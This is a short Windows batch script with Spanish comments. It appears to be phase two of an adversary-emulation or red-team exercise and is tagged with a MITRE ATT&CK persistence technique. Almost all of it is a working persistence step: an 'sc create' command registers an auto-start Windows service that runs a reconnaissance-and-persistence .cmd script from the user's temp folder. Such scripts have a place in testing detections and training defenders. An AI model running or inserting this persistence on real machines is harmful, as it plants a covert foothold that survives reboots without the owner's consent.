@echo off
REM Fase 2 – Persistencia mediante servicio
REM Técnica: T1543.001 - Windows Service

echo "Creando servicio para persistencia..."
sc create "Fase2Service" binPath= "%TEMP%\fase2-recon-persist.cmd" start= auto
echo "Servicio Fase2Service creado"
pause
